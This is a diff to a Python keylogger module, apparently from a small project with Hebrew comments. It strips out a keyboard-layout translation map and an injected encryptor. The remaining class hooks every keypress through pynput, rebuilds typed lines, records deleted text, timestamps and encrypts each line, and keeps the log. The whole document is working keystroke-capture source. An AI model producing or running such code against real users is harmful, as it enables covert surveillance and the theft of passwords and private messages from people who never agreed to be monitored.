@@ -1,43 +1,22 @@
 from pynput import keyboard
 from datetime import datetime
 from encryptor import Encryptor
-import platform
-
-EN_TO_HEB = {
-    'a': 'ש', 'b': 'נ', 'c': 'ב', 'd': 'ג', 'e': 'ק',
-    'f': 'כ', 'g': 'ע', 'h': 'י', 'i': 'ן', 'j': 'ח',
-    'k': 'ל', 'l': 'ך', 'm': 'צ', 'n': 'מ', 'o': 'ם',
-    'p': 'פ', 'q': '/', 'r': 'ר', 's': 'ד', 't': 'א',
-    'u': 'ו', 'v': 'ה', 'w': "'", 'x': 'ס', 'y': 'ט',
-    'z': 'ז',
-
-    'ש': 'a', 'נ': 'b', 'ב': 'c', 'ג': 'd', 'ק': 'e',
-    'כ': 'f', 'ע': 'g', 'י': 'h', 'ן': 'i', 'ח': 'j',
-    'ל': 'k', 'ך': 'l', 'צ': 'm', 'מ': 'n', 'ם': 'o',
-    'פ': 'p', '/': 'q', 'ר': 'r', 'ד': 's', 'א': 't',
-    'ו': 'u', 'ה': 'v', "'": 'w', 'ס': 'x', 'ט': 'y',
-    'ז': 'z',
-}
 
 class KeyloggerService:
-    def __init__(self, encryptor: Encryptor):
-        self.flag = False
+    def __init__(self):
         self.current_line = ""
         self.current_word = ""
         self.logged_lines = []
         self.listener = None
         self.backspace_count = 0
         self.backspace_active = False
-        self.pressed_keys = set()
-        self.system = platform.system()
-        self.encryptor = encryptor
 
+    # -------------------- START/STOP --------------------
     def start_logging(self):
         if self.listener and self.listener.running:
             return
         self.listener = keyboard.Listener(
-            on_press=self._on_press,
-            on_release=self._on_release
+            on_press=self._on_press
         )
         self.listener.start()
 
@@ -53,8 +32,8 @@ class KeyloggerService:
             self._log_current_line()
             self.current_line = ""
 
+    # -------------------- KEY HANDLING --------------------
     def _on_press(self, key):
-        self.pressed_keys.add(key)
         try:
             char = key.char
         except AttributeError:
@@ -75,13 +54,12 @@ class KeyloggerService:
                 self._apply_backspace()
             self.backspace_active = False
             self.backspace_count = 0
+
             if char is not None:
                 self._handle_char(char)
 
-    def _on_release(self, key):
-        if key in self.pressed_keys:
-            self.pressed_keys.remove(key)
 
+    # -------------------- CHARACTER HANDLING --------------------
     def _handle_char(self, char):
         if char == " ":
             self.current_line += self.current_word + " "
@@ -94,11 +72,9 @@ class KeyloggerService:
                 self._log_current_line()
             self.current_line = ""
         else:
-            if self.flag:
-                self.current_word += EN_TO_HEB.get(char, char)
-            else:
-                self.current_word += char
+            self.current_word += char
 
+    # -------------------- BACKSPACE --------------------
     def _apply_backspace(self):
         count = self.backspace_count
         removed = ""
@@ -115,11 +91,13 @@ class KeyloggerService:
             self.current_line += f" (נמחק: {removed}) "
         self.backspace_count = 0
 
+    # -------------------- LOGGING --------------------
     def _log_current_line(self):
         timestamp = datetime.now().strftime("%H:%M")
         log_line = f"{timestamp} | {self.current_line.strip()}"
-        encrypted_log = self.encryptor.encrypt(log_line)
+        encrypted_log = Encryptor.encrypt(log_line)
         self.logged_lines.append(encrypted_log)
 
+    # -------------------- GET LOG --------------------
     def get_logged_lines(self):
         return self.logged_lines
